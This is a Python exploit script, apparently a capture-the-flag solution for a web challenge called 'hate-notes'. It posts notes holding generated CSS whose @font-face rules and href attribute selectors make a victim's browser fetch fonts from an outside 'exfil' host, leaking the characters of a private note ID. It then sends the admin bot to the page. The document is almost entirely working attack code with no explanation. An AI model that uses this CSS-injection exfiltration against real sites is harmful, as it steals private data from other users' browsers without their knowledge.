import itertools
import requests

exfil = 'https://exfil/meow.ttf?a='
host = 'https://inst-92d67f4152526729-hate-notes.chal.crewc.tf'


href = '/api/notes/61340ecb-7999-45a6-82fd-b097c296bc1b'

def create_css():
    chars = '1234567890abcdef-'
    prods = itertools.product(chars, repeat=2)

    chunk = ''

    for prod in prods:
        p = ''.join(prod)

        rule = f'''@font-face {{
    font-family: "exfil_{p}";
    src: url("{exfil}{p}");
}}
li:last-child a[href^="{href}{p}"] {{
    font-family: "exfil_{p}";
}}
'''
        if len(chunk + rule) > 9000:
            yield chunk
            chunk = rule
        else:
            chunk += rule
    if len(chunk) > 0: yield chunk

chunks = create_css()

s = requests.Session()

print('loggin in... ')
# login
d = { 'email':'a', 'password':'a' }
r = s.post(f'{host}/api/auth/login', data=d, allow_redirects=False)


print('posting css... ')
css_note_ids = []
for chunk in chunks:
    # post css
    d = { 'title':'h1 { color', 'content':f'note = magenta; }}\n{chunk}' }
    r = s.post(f'{host}/api/notes', data=d, allow_redirects=False)
    note_id = r.json()['id']
    css_note_ids.append(note_id)

print('posting links... ')
# post link
link_tags = [ f'<link rel="stylesheet" href="https://inst-92d67f4152526729-hate-notes.chal.crewc.tf/static/api/notes/{note_id}">' for note_id in css_note_ids ]
link_tags = ''.join(link_tags)

d = { 'title':'meow', 'content': link_tags }
r = s.post(f'{host}/api/notes', data=d, allow_redirects=False)
note_id = r.json()['id']
print(f'{note_id}')

# send bot
d = { 'noteId': note_id }
r = s.post(f'{host}/report', data=d, allow_redirects=False)
print(f'{r.text=}')